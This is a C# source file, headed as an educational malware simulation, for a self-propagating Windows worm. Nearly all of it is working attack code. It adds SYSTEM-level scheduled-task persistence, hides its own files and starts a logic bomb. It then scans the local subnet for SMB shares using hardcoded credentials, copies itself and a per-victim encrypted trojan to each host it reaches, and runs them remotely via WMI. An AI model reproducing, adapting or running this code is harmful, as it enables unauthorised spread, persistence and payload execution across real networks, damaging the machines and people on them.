using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using AuthenticationLevel = System.Management.AuthenticationLevel;
using Microsoft.Win32;
/// <summary>
/// EDUCATIONAL MALWARE SIMULATION - FOR CYBERSECURITY COURSE ONLY
/// Self-Propagating Worm with Polymorphic Encryption and Persistence
/// MUST ONLY BE RUN IN ISOLATED VM ENVIRONMENTS
/// </summary>
class Program
{
    private const string SMB_USERNAME = "user";
    private const string SMB_PASSWORD = "user";
    private const string SMB_SHARE_NAME = "SharedFolder";
    private const string PAYLOAD_FOLDER_NAME = "payload";
    private const string WORM_EXE_NAME = "Worm.exe";
    private const string LOGICBOMB_EXE_NAME = "LogicBomb.exe";
    private const string ENCRYPTED_BOMB_NAME = "bomb.encrypted";

    private const int PING_TIMEOUT_MS = 300;
    private const int MAX_CONCURRENT_SCANS = 50;
    private const int SCAN_INTERVAL_MINUTES = 10;

    private const string WORM_TASK_NAME = "MaliciousWorm_Persistence";
    private const string LOGICBOMB_TASK_NAME = "MaliciousLogicBomb_Monitor";

    private static string logFilePath;

    static async Task Main()
    {
        Console.WriteLine("===========================================");
        Console.WriteLine("PERSISTENT SELF-PROPAGATING WORM");
        Console.WriteLine("Educational Malware Simulation");
        Console.WriteLine("===========================================");
        Console.WriteLine();

        // Initialize log file
        string baseDir = AppDomain.CurrentDomain.BaseDirectory;
        logFilePath = Path.Combine(baseDir, "worm_activity.log");

        LogToFile("========================================");
        LogToFile($"Worm started at {DateTime.Now:yyyy-MM-dd HH:mm:ss}");
        LogToFile($"Process ID: {Process.GetCurrentProcess().Id}");
        LogToFile($"Base Directory: {baseDir}");
        LogToFile("========================================");

        try
        {
            // Step 1: Install persistence for both Worm and LogicBomb
            LogInfo("Installing persistence...");
            InstallPersistence();

            // Step 2: Set file attributes (Hidden + System)
            LogInfo("Setting file attributes...");
            SetFileAttributes();

            // Step 3: Start LogicBomb locally
            LogInfo("Starting LogicBomb locally...");
            StartLogicBombLocally();

            // Step 4: Begin continuous scanning loop
            LogInfo("Starting continuous network scanning...");
            await ContinuousScanLoop();
        }
        catch (Exception ex)
        {
            LogError($"Critical error in main loop: {ex.Message}");
            LogToFile($"Stack trace: {ex.StackTrace}");
        }
    }

    private static void InstallPersistence()
    {
        try
        {
            string baseDir = AppDomain.CurrentDomain.BaseDirectory;
            string wormPath = Process.GetCurrentProcess().MainModule.FileName;
            string logicBombPath = Path.Combine(baseDir, PAYLOAD_FOLDER_NAME, LOGICBOMB_EXE_NAME);

            // Create scheduled task for Worm
            bool wormTaskCreated = CreateScheduledTask(WORM_TASK_NAME, wormPath);
            if (wormTaskCreated)
            {
                LogSuccess($"Worm persistence installed: {WORM_TASK_NAME}");
            }
            else
            {
                LogWarning($"Failed to create Worm scheduled task - continuing anyway");
            }

            // Create scheduled task for LogicBomb
            if (File.Exists(logicBombPath))
            {
                bool logicBombTaskCreated = CreateScheduledTask(LOGICBOMB_TASK_NAME, logicBombPath);
                if (logicBombTaskCreated)
                {
                    LogSuccess($"LogicBomb persistence installed: {LOGICBOMB_TASK_NAME}");
                }
                else
                {
                    LogWarning($"Failed to create LogicBomb scheduled task - continuing anyway");
                }
            }
            else
            {
                LogWarning($"LogicBomb.exe not found at {logicBombPath}, skipping persistence");
            }
        }
        catch (Exception ex)
        {
            LogError($"Persistence installation failed: {ex.Message} - continuing anyway");
            LogToFile($"Stack trace: {ex.StackTrace}");
        }
    }

    private static bool CreateScheduledTask(string taskName, string exePath)
    {
        try
        {
            // Delete existing task if it exists
            ProcessStartInfo deleteTask = new ProcessStartInfo
            {
                FileName = "schtasks.exe",
                Arguments = $"/Delete /TN \"{taskName}\" /F",
                CreateNoWindow = true,
                UseShellExecute = false,
                RedirectStandardOutput = true,
                RedirectStandardError = true
            };

            using (Process deleteProcess = Process.Start(deleteTask))
            {
                deleteProcess.WaitForExit();
                // Ignore result - task may not exist
            }

            // Create new task
            ProcessStartInfo createTask = new ProcessStartInfo
            {
                FileName = "schtasks.exe",
                Arguments = $"/Create /SC ONSTART /TN \"{taskName}\" /TR \"\\\"{exePath}\\\"\" /RU SYSTEM /RL HIGHEST /F",
                CreateNoWindow = true,
                UseShellExecute = false,
                RedirectStandardOutput = true,
                RedirectStandardError = true
            };

            using (Process createProcess = Process.Start(createTask))
            {
                string output = createProcess.StandardOutput.ReadToEnd();
                string error = createProcess.StandardError.ReadToEnd();
                createProcess.WaitForExit();

                if (createProcess.ExitCode == 0)
                {
                    LogToFile($"Scheduled task created: {taskName}");
                    LogToFile($"Task executes: {exePath}");
                    return true;
                }
                else
                {
                    LogToFile($"Failed to create task {taskName}: {error}");
                    return false;
                }
            }
        }
        catch (Exception ex)
        {
            LogToFile($"Exception creating task {taskName}: {ex.Message}");
            return false;
        }
    }

    private static void SetFileAttributes()
    {
        try
        {
            string baseDir = AppDomain.CurrentDomain.BaseDirectory;
            string wormPath = Process.GetCurrentProcess().MainModule.FileName;

            // Set Worm.exe as Hidden + System
            if (File.Exists(wormPath))
            {
                File.SetAttributes(wormPath, FileAttributes.Hidden | FileAttributes.System);
                LogSuccess($"Set attributes for Worm.exe");
            }

            // Set attributes for payload folder contents
            string payloadDir = Path.Combine(baseDir, PAYLOAD_FOLDER_NAME);
            if (Directory.Exists(payloadDir))
            {
                foreach (string file in Directory.GetFiles(payloadDir, "*.*", SearchOption.AllDirectories))
                {
                    try
                    {
                        File.SetAttributes(file, FileAttributes.Hidden | FileAttributes.System);
                    }
                    catch { } // Ignore individual file errors
                }
                LogSuccess($"Set attributes for payload folder contents");
            }
        }
        catch (Exception ex)
        {
            LogWarning($"Failed to set file attributes: {ex.Message} - continuing anyway");
        }
    }

    private static void StartLogicBombLocally()
    {
        try
        {
            string logicBombPath = Path.Combine(
                AppDomain.CurrentDomain.BaseDirectory,
                PAYLOAD_FOLDER_NAME,
                LOGICBOMB_EXE_NAME
            );

            if (!File.Exists(logicBombPath))
            {
                LogWarning("LogicBomb.exe not found, skipping local start");
                return;
            }

            // Check if already running
            var localProcesses = Process.GetProcessesByName("LogicBomb");
            if (localProcesses.Length > 0)
            {
                LogInfo("LogicBomb already running locally");
                return;
            }

            // Start LogicBomb
            ProcessStartInfo psi = new ProcessStartInfo
            {
                FileName = logicBombPath,
                UseShellExecute = true,
                CreateNoWindow = true,
                WindowStyle = ProcessWindowStyle.Hidden
            };

            Process.Start(psi);
            LogSuccess("LogicBomb started locally");
        }
        catch (Exception ex)
        {
            LogWarning($"Failed to start LogicBomb locally: {ex.Message}");
        }
    }

    private static async Task ContinuousScanLoop()
    {
        int scanCount = 0;

        while (true)
        {
            scanCount++;
            LogInfo($"========== SCAN #{scanCount} ==========");
            LogInfo($"Scan started at {DateTime.Now:yyyy-MM-dd HH:mm:ss}");

            try
            {
                string localIP = GetLocalIPAddress();
                if (localIP == null)
                {
                    LogError("Could not detect local IP address, retrying in 10 minutes");
                }
                else
                {
                    string baseIP = string.Join(".", localIP.Split('.').Take(3));
                    LogInfo($"Local IP: {localIP}");
                    LogInfo($"Scanning network: {baseIP}.1 - {baseIP}.254");

                    var progress = new Progress<ScanProgress>(p =>
                    {
                        if (p.Completed % 50 == 0)
                        {
                            LogToFile($"Scan progress: {p.Completed}/254 hosts checked, {p.ActiveSmb} targets found");
                        }
                    });

                    List<string> smbHosts = await FindSmbServersAsync(baseIP, progress, CancellationToken.None);

                    LogInfo($"Scan complete: Found {smbHosts.Count} SMB host(s)");

                    if (smbHosts.Count > 0)
                    {
                        string tempFolder = Path.Combine(Path.GetTempPath(), $"WormDeploy_{Guid.NewGuid():N}");
                        PrepareDeploymentPackage(tempFolder);

                        foreach (string ip in smbHosts)
                        {
                            await ProcessTargetHost(ip, tempFolder);
                        }

                        // Cleanup temp folder
                        try
                        {
                            if (Directory.Exists(tempFolder))
                            {
                                Directory.Delete(tempFolder, true);
                            }
                        }
                        catch { }
                    }
                }
            }
            catch (Exception ex)
            {
                LogError($"Error during scan #{scanCount}: {ex.Message}");
            }

            LogInfo($"Scan #{scanCount} complete. Waiting {SCAN_INTERVAL_MINUTES} minutes before next scan...");
            LogInfo($"Next scan at approximately {DateTime.Now.AddMinutes(SCAN_INTERVAL_MINUTES):yyyy-MM-dd HH:mm:ss}");
            LogToFile("");

            await Task.Delay(TimeSpan.FromMinutes(SCAN_INTERVAL_MINUTES));
        }
    }

    private static async Task ProcessTargetHost(string ip, string tempFolder)
    {
        LogInfo($"--- Processing target: {ip} ---");
        string remoteShareUNC = $"\\\\{ip}\\{SMB_SHARE_NAME}";

        if (IsWormAlreadyRunningOnTarget(ip))
        {
            LogInfo($"Worm already running on {ip}, skipping");
            return;
        }

        int smbConnectResult = ConnectToRemoteShare(remoteShareUNC, SMB_USERNAME, SMB_PASSWORD);

        if (smbConnectResult == 0)
        {
            LogSuccess($"Connected to {ip}");
            bool propagationSucceeded = true;

            try
            {
                string victimMachineGuid = GetRemoteMachineGuid(ip, SMB_USERNAME, SMB_PASSWORD);
                LogInfo($"Victim Machine GUID: {victimMachineGuid}");

                string victimSpecificBomb = Path.Combine(tempFolder, "bomb_victim.encrypted");
                ReEncryptTrojanForVictim(tempFolder, victimSpecificBomb, victimMachineGuid);

                // --- FILE COPY LOGIC ---

                // 1. Copy Worm.exe
                try
                {
                    string localWormPath = Path.Combine(tempFolder, WORM_EXE_NAME);
                    string remoteWormPath = Path.Combine(remoteShareUNC, WORM_EXE_NAME);
                    LogInfo($"Attempting to copy {WORM_EXE_NAME} to {ip}...");
                    File.Copy(localWormPath, remoteWormPath, true);
                    LogSuccess($"{WORM_EXE_NAME} copied successfully.");
                }
                catch (Exception ex)
                {
                    LogError($"Failed to copy {WORM_EXE_NAME}: {ex.Message}");
                    propagationSucceeded = false;
                }

                // 2. Copy Payload Folder
                if (propagationSucceeded)
                {
                    try
                    {
                        string localPayloadFolder = Path.Combine(tempFolder, PAYLOAD_FOLDER_NAME);
                        string remotePayloadFolder = Path.Combine(remoteShareUNC, PAYLOAD_FOLDER_NAME);
                        LogInfo($"Attempting to copy '{PAYLOAD_FOLDER_NAME}' folder to {ip}...");
                        await CopyFolderAsync(localPayloadFolder, remotePayloadFolder);
                        LogSuccess($"'{PAYLOAD_FOLDER_NAME}' folder copied successfully.");
                    }
                    catch (Exception ex)
                    {
                        LogError($"Failed to copy '{PAYLOAD_FOLDER_NAME}' folder: {ex.Message}");
                        propagationSucceeded = false;
                    }
                }

                // 3. *** FIX: Delete original bomb, then copy the re-encrypted one ***
                if (propagationSucceeded)
                {
                    string remoteBombPath = Path.Combine(remoteShareUNC, PAYLOAD_FOLDER_NAME, ENCRYPTED_BOMB_NAME);
                    try
                    {
                        // First, try to delete the bomb that was just copied with the folder.
                        LogInfo($"Attempting to delete original bomb at {remoteBombPath}...");
                        if (File.Exists(remoteBombPath))
                        {
                            File.Delete(remoteBombPath);
                            LogSuccess($"Original bomb deleted successfully.");
                        }
                        else
                        {
                            LogWarning("Original bomb not found, may have been blocked by AV. Proceeding to copy.");
                        }

                        // Now, copy the new, re-encrypted bomb. This is now a 'create' operation.
                        LogInfo($"Attempting to copy re-encrypted bomb to {remoteBombPath}...");
                        File.Copy(victimSpecificBomb, remoteBombPath, false); // 'false' for no overwrite
                        LogSuccess($"Re-encrypted bomb copied successfully.");
                    }
                    catch (Exception ex)
                    {
                        LogError($"Failed to replace the encrypted bomb: {ex.Message}");
                        propagationSucceeded = false;
                    }
                }

                if (propagationSucceeded)
                {
                    LogSuccess($"All files copied successfully to {ip}");
                    SetRemoteFileAttributes(ip, remoteShareUNC);

                    string remoteWormExePath = $"C:\\{SMB_SHARE_NAME}\\{WORM_EXE_NAME}";
                    LogInfo($"Attempting to execute Worm remotely on {ip} via WMI...");
                    bool wormExecuted = ExecuteRemoteCommandWMI(ip, SMB_USERNAME, SMB_PASSWORD, remoteWormExePath, "Worm");

                    if (wormExecuted)
                    {
                        LogSuccess($"Successfully propagated and executed on {ip}. A new log will be created on the victim machine.");
                    }
                    else
                    {
                        LogWarning($"File copy succeeded but execution failed on {ip}. The payload was likely blocked by antivirus.");
                    }
                }
                else
                {
                    LogError($"Propagation to {ip} failed due to file copy errors. Aborting execution step.");
                }

                if (File.Exists(victimSpecificBomb)) File.Delete(victimSpecificBomb);
            }
            catch (Exception ex)
            {
                LogError($"A critical error occurred while processing {ip}: {ex.Message}");
            }
            finally
            {
                DisconnectFromRemoteShare(remoteShareUNC);
            }
        }
        else
        {
            LogWarning($"SMB connection to {ip} failed - Error: {GetWNetErrorDescription(smbConnectResult)}");
        }
    }

    private static bool IsWormAlreadyRunningOnTarget(string remoteIp)
    {
        try
        {
            ConnectionOptions connOpts = new ConnectionOptions
            {
                Username = SMB_USERNAME,
                Password = SMB_PASSWORD,
                Impersonation = ImpersonationLevel.Impersonate,
                Authentication = AuthenticationLevel.Default,
                Timeout = TimeSpan.FromSeconds(10)
            };

            string path = $"\\\\{remoteIp}\\root\\cimv2";
            var scope = new ManagementScope(path, connOpts);
            scope.Connect();

            string query = "SELECT * FROM Win32_Process WHERE Name = 'Worm.exe'";
            var searcher = new ManagementObjectSearcher(scope, new ObjectQuery(query));
            var results = searcher.Get();

            return results.Count > 0;
        }
        catch
        {
            // If check fails, assume not running
            return false;
        }
    }

    private static void SetRemoteFileAttributes(string remoteIp, string remoteShareUNC)
    {
        try
        {
            // Set Worm.exe attributes
            string remoteWormPath = Path.Combine(remoteShareUNC, WORM_EXE_NAME);
            if (File.Exists(remoteWormPath))
            {
                File.SetAttributes(remoteWormPath, FileAttributes.Hidden | FileAttributes.System);
            }

            // Set payload folder attributes
            string remotePayloadFolder = Path.Combine(remoteShareUNC, PAYLOAD_FOLDER_NAME);
            if (Directory.Exists(remotePayloadFolder))
            {
                foreach (string file in Directory.GetFiles(remotePayloadFolder, "*.*", SearchOption.AllDirectories))
                {
                    try
                    {
                        File.SetAttributes(file, FileAttributes.Hidden | FileAttributes.System);
                    }
                    catch { }
                }
            }

            LogSuccess($"Set file attributes on {remoteIp}");
        }
        catch (Exception ex)
        {
            LogWarning($"Failed to set attributes on {remoteIp}: {ex.Message}");
        }
    }

    private static string GetRemoteMachineGuid(string remoteIp, string username, string password)
    {
        LogInfo($"Querying Machine GUID from {remoteIp}...");

        try
        {
            ConnectionOptions connOpts = new ConnectionOptions
            {
                Username = username,
                Password = password,
                Impersonation = ImpersonationLevel.Impersonate,
                Authentication = AuthenticationLevel.Default,
                EnablePrivileges = true,
                Timeout = TimeSpan.FromSeconds(15)
            };

            string path = $"\\\\{remoteIp}\\root\\CIMV2";
            var scope = new ManagementScope(path, connOpts);
            scope.Connect();

            var regProv = new ManagementClass(scope, new ManagementPath("StdRegProv"), null);

            var inParams = regProv.GetMethodParameters("GetStringValue");
            inParams["hDefKey"] = 0x80000002;
            inParams["sSubKeyName"] = @"SOFTWARE\Microsoft\Cryptography";
            inParams["sValueName"] = "MachineGuid";

            var outParams = regProv.InvokeMethod("GetStringValue", inParams, null);

            if (outParams != null && outParams["sValue"] != null)
            {
                string guid = outParams["sValue"].ToString();
                if (!string.IsNullOrEmpty(guid))
                {
                    return guid;
                }
            }
        }
        catch (Exception ex)
        {
            LogWarning($"Failed to get Machine GUID from {remoteIp}: {ex.Message}");
        }

        return "DEFAULT_MACHINE_ID";
    }

    private static void ReEncryptTrojanForVictim(string tempFolder, string outputPath, string victimMachineGuid)
    {
        string trojanPath = Path.Combine(tempFolder, PAYLOAD_FOLDER_NAME, "Trojan.exe");

        if (!File.Exists(trojanPath))
        {
            string localBombPath = Path.Combine(tempFolder, PAYLOAD_FOLDER_NAME, ENCRYPTED_BOMB_NAME);
            if (File.Exists(localBombPath))
            {
                string localMachineGuid = CryptoUtils.GetMachineGuid();
                CryptoUtils.DecryptFile(localBombPath, trojanPath, localMachineGuid);
            }
            else
            {
                throw new FileNotFoundException($"Trojan.exe not found at {trojanPath}");
            }
        }

        CryptoUtils.EncryptFile(trojanPath, outputPath, victimMachineGuid);
    }

    private static async Task<List<string>> FindSmbServersAsync(
        string baseIP,
        IProgress<ScanProgress> progress = null,
        CancellationToken cancellationToken = default)
    {
        var activeHosts = new List<string>();
        var pingTasks = new List<Task>();
        var semaphore = new SemaphoreSlim(MAX_CONCURRENT_SCANS);
        int completed = 0;
        int activeSmbCount = 0;

        for (int i = 1; i <= 254; i++)
        {
            if (cancellationToken.IsCancellationRequested)
                break;

            string ip = $"{baseIP}.{i}";
            await semaphore.WaitAsync(cancellationToken);

            pingTasks.Add(Task.Run(async () =>
            {
                try
                {
                    using (var ping = new Ping())
                    {
                        var reply = await ping.SendPingAsync(ip, PING_TIMEOUT_MS);

                        if (reply.Status == IPStatus.Success)
                        {
                            string smbPath = $"\\\\{ip}\\{SMB_SHARE_NAME}";
                            int result = ConnectToRemoteShare(smbPath, SMB_USERNAME, SMB_PASSWORD);

                            if (result == 0)
                            {
                                lock (activeHosts)
                                {
                                    activeHosts.Add(ip);
                                    activeSmbCount++;
                                }
                                DisconnectFromRemoteShare(smbPath);
                            }
                        }
                    }
                }
                catch { }
                finally
                {
                    semaphore.Release();
                    int currentCompleted = Interlocked.Increment(ref completed);
                    progress?.Report(new ScanProgress
                    {
                        Completed = currentCompleted,
                        ActiveSmb = activeSmbCount
                    });
                }
            }, cancellationToken));
        }

        await Task.WhenAll(pingTasks);
        return activeHosts;
    }

    private static void PrepareDeploymentPackage(string tempFolder)
    {
        Directory.CreateDirectory(tempFolder);

        string exePath = Process.GetCurrentProcess().MainModule.FileName;
        File.Copy(exePath, Path.Combine(tempFolder, Path.GetFileName(exePath)), overwrite: true);

        string payloadFolder = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, PAYLOAD_FOLDER_NAME);
        if (Directory.Exists(payloadFolder))
        {
            CopyFolderSync(payloadFolder, Path.Combine(tempFolder, PAYLOAD_FOLDER_NAME));
        }
    }

    private static void CopyFolderSync(string source, string dest)
    {
        Directory.CreateDirectory(dest);

        foreach (string file in Directory.GetFiles(source))
        {
            string fileName = Path.GetFileName(file);
            File.Copy(file, Path.Combine(dest, fileName), true);
        }

        foreach (string dir in Directory.GetDirectories(source))
        {
            string dirName = Path.GetFileName(dir);
            CopyFolderSync(dir, Path.Combine(dest, dirName));
        }
    }

    private static async Task CopyFolderAsync(string source, string dest)
    {
        Directory.CreateDirectory(dest);

        var fileTasks = Directory.GetFiles(source)
            .Select(file => Task.Run(() =>
            {
                string fileName = Path.GetFileName(file);
                File.Copy(file, Path.Combine(dest, fileName), true);
            }))
            .ToList();

        await Task.WhenAll(fileTasks);

        foreach (string dir in Directory.GetDirectories(source))
        {
            string dirName = Path.GetFileName(dir);
            await CopyFolderAsync(dir, Path.Combine(dest, dirName));
        }
    }

    private static string GetLocalIPAddress()
    {
        try
        {
            var host = System.Net.Dns.GetHostEntry(System.Net.Dns.GetHostName());
            return host.AddressList
                .FirstOrDefault(a => a.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
                ?.ToString();
        }
        catch
        {
            return null;
        }
    }

    private static bool ExecuteRemoteCommandWMI(string remoteIp, string username, string password, string commandToExecute, string componentName)
    {
        try
        {
            ConnectionOptions connOpts = new ConnectionOptions
            {
                Username = username,
                Password = password,
                Impersonation = ImpersonationLevel.Impersonate,
                Authentication = AuthenticationLevel.Default,
                EnablePrivileges = true,
                Timeout = TimeSpan.FromSeconds(30)
            };

            string path = $"\\\\{remoteIp}\\root\\cimv2";
            var scope = new ManagementScope(path, connOpts);
            scope.Connect();

            using (var processClass = new ManagementClass(scope, new ManagementPath("Win32_Process"), new ObjectGetOptions()))
            {
                var inParams = processClass.GetMethodParameters("Create");
                inParams["CommandLine"] = commandToExecute;

                var outParams = processClass.InvokeMethod("Create", inParams, null);

                if (outParams != null)
                {
                    var returnCode = Convert.ToInt32(outParams["returnValue"]);

                    if (returnCode == 0 || returnCode == 2)
                    {
                        return true;
                    }
                }
            }
        }
        catch { }

        return false;
    }

    [DllImport("mpr.dll", CharSet = CharSet.Unicode)]
    private static extern int WNetAddConnection2(ref NETRESOURCE netResource, string password, string username, int flags);

    [DllImport("mpr.dll", CharSet = CharSet.Unicode)]
    private static extern int WNetCancelConnection2(string name, int flags, bool force);

    private static int ConnectToRemoteShare(string remotePath, string username, string password)
    {
        var nr = new NETRESOURCE
        {
            dwType = 1,
            lpRemoteName = remotePath
        };
        return WNetAddConnection2(ref nr, password, username, 0);
    }

    private static void DisconnectFromRemoteShare(string remotePath)
    {
        try
        {
            WNetCancelConnection2(remotePath, 0, true);
        }
        catch { }
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    private struct NETRESOURCE
    {
        public int dwScope;
        public int dwType;
        public int dwDisplayType;
        public int dwUsage;
        public string lpLocalName;
        public string lpRemoteName;
        public string lpComment;
        public string lpProvider;
    }

    private static void LogInfo(string message)
    {
        string logMessage = $"[INFO] {message}";
        Console.ForegroundColor = ConsoleColor.Cyan;
        Console.WriteLine(logMessage);
        Console.ResetColor();
        LogToFile(logMessage);
    }

    private static void LogSuccess(string message)
    {
        string logMessage = $"[SUCCESS] {message}";
        Console.ForegroundColor = ConsoleColor.Green;
        Console.WriteLine(logMessage);
        Console.ResetColor();
        LogToFile(logMessage);
    }

    private static void LogWarning(string message)
    {
        string logMessage = $"[WARNING] {message}";
        Console.ForegroundColor = ConsoleColor.Yellow;
        Console.WriteLine(logMessage);
        Console.ResetColor();
        LogToFile(logMessage);
    }

    private static void LogError(string message)
    {
        string logMessage = $"[ERROR] {message}";
        Console.ForegroundColor = ConsoleColor.Red;
        Console.WriteLine(logMessage);
        Console.ResetColor();
        LogToFile(logMessage);
    }

    private static void LogToFile(string message)
    {
        try
        {
            string timestamp = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");
            string logEntry = $"[{timestamp}] {message}";
            File.AppendAllText(logFilePath, logEntry + Environment.NewLine);
        }
        catch { }
    }

    private static string GetWNetErrorDescription(int errorCode)
    {
        switch (errorCode)
        {
            case 0: return "Success";
            case 5: return "Access is denied";
            case 53: return "The network path was not found";
            case 86: return "The specified network password is not correct";
            case 1219: return "Multiple connections to a server not allowed";
            case 1326: return "Logon failure: unknown user name or bad password";
            default: return $"Error code {errorCode}";
        }
    }

    private struct ScanProgress
    {
        public int Completed { get; set; }
        public int ActiveSmb { get; set; }
    }

    // Embedded CryptoUtils class
    public static class CryptoUtils
    {
        private const string DEFAULT_MACHINE_ID = "DEFAULT_MACHINE_ID";
        private const string IV_SALT = "_IV_SALT_2025";

        public static string GetMachineGuid()
        {
            try
            {
                using (RegistryKey key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Cryptography"))
                {
                    if (key != null)
                    {
                        object guidValue = key.GetValue("MachineGuid");
                        if (guidValue != null)
                        {
                            string guid = guidValue.ToString();
                            if (!string.IsNullOrEmpty(guid))
                            {
                                Console.WriteLine($"[CryptoUtils] Machine GUID: {guid}");
                                return guid;
                            }
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[CryptoUtils] Failed to read Machine GUID: {ex.Message}");
            }

            Console.WriteLine($"[CryptoUtils] Using fallback: {DEFAULT_MACHINE_ID}");
            return DEFAULT_MACHINE_ID;
        }

        public static byte[] DeriveKeyFromMachineId(string machineId)
        {
            using (SHA256 sha = SHA256.Create())
            {
                byte[] inputBytes = Encoding.UTF8.GetBytes(machineId);
                byte[] hash = sha.ComputeHash(inputBytes);

                byte[] key = new byte[32];
                Array.Copy(hash, key, 32);

                return key;
            }
        }

        public static byte[] DeriveIVFromMachineId(string machineId)
        {
            using (SHA256 sha = SHA256.Create())
            {
                byte[] inputBytes = Encoding.UTF8.GetBytes(machineId + IV_SALT);
                byte[] hash = sha.ComputeHash(inputBytes);

                byte[] iv = new byte[16];
                Array.Copy(hash, iv, 16);

                return iv;
            }
        }
        public static void EncryptFile(string inputFile, string outputFile, string machineId)
        {
            byte[] key = DeriveKeyFromMachineId(machineId);
            byte[] iv = DeriveIVFromMachineId(machineId);

            using (Aes aes = Aes.Create())
            {
                aes.Key = key;
                aes.IV = iv;

                using (System.IO.FileStream fsInput = new System.IO.FileStream(inputFile, System.IO.FileMode.Open, System.IO.FileAccess.Read))
                using (System.IO.FileStream fsOutput = new System.IO.FileStream(outputFile, System.IO.FileMode.Create, System.IO.FileAccess.Write))
                using (CryptoStream cs = new CryptoStream(fsOutput, aes.CreateEncryptor(), CryptoStreamMode.Write))
                {
                    fsInput.CopyTo(cs);
                }
            }
        }
        public static void DecryptFile(string inputFile, string outputFile, string machineId)
        {
            byte[] key = DeriveKeyFromMachineId(machineId);
            byte[] iv = DeriveIVFromMachineId(machineId);

            using (Aes aes = Aes.Create())
            {
                aes.Key = key;
                aes.IV = iv;

                using (FileStream fsInput = new FileStream(inputFile, FileMode.Open, FileAccess.Read))
                using (FileStream fsOutput = new FileStream(outputFile, FileMode.Create, FileAccess.Write))
                using (CryptoStream cs = new CryptoStream(fsInput, aes.CreateDecryptor(), CryptoStreamMode.Read))
                {
                    cs.CopyTo(fsOutput);
                }
            }
        }
    }
}